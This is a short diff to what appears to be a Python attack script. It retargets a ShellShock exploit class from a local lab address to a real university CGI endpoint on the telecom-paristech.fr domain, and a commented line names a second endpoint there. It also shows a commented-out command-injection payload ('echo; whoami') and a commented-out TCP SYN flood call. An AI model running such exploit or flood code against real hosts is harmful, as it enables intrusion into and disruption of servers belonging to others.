@@ -355,8 +355,14 @@ if __name__ == "__main__":
 
     # f = DOS("192.168.0.17", 80)
     # f.tcp_syn_flood()
+    # http://service.tsi.telecom-paristech.fr/cgi-bin/conference/list.cgi
+    url = "biblio.telecom-paristech.fr/cgi-bin/download.cgi"
+    url = url.replace('http://', '')
+    host, page = url.split('/', 1)
 
-    victim = ShellShock("192.168.0.21", "cgi-bin/test.sh")
-    if victim.test():
-        victim.run("echo; whoami")
-        print victim.get["cgi-bin/test.sh"]['data']
+    # victim = ShellShock("192.168.0.21", "cgi-bin/test.sh")
+    victim = ShellShock(host, page)
+    victim.test()
+    # if victim.test():
+    #     victim.run("echo; whoami")
+    #     print victim.get["cgi-bin/test.sh"]['data']
